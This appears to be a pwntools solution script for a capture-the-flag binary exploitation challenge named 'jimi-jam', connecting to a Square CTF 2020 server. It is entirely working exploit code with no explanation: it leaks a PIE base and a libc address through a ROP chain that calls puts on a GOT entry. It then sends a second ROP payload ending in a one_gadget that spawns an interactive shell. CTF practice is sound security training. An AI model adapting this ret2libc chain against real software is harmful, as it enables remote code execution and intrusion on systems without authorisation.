from pwn import *
import sys

# io = process(["./jimi-jam"], env={ "LD_PRELOAD": "./libc.so.6" })
io = remote("challenges.2020.squarectf.com", 9000)

io.recvline()

center = io.recvline().rsplit(b" ", 1)[-1].strip()
base = int(center.decode("utf-8")[2:], 16) - 0x4060
print(center)
print(hex(base))

io.recvline()

pop_rdi = 0x00000000000013a3 + base
loop = 0x127c + base
loop = 0x130d + base
puts_got = 0x3fa0 + base

print("puts_got", hex(puts_got))

jail = base + 0x4060

payload = b"A" * 16 + p64(pop_rdi) + p64(puts_got) + p64(loop)

io.sendline(payload)
print("Sent first payload")

puts = io.readline()[:-1].ljust(8, b"\x00")
print("puts", puts)

puts = u64(puts)

libc_base = puts - 0x625a0 - 0x25000
print("libc_base", hex(libc_base))

gadget = libc_base + 0xe6e79
print("gadget", hex(gadget))

pop_rsi = 0x0000000000027529 + libc_base
pop_rdx_pop_r12 = 0x000000000011c371 + libc_base

io.readline()
io.readline()

padding = b"B" * 8 + p64(base + 0x4000 + 0x78)
payload = padding + p64(pop_rsi) + p64(0) + p64(pop_rdx_pop_r12) + p64(0) + p64(0) + p64(gadget)
io.sendline(payload)
print("Sent second payload")

io.interactive()
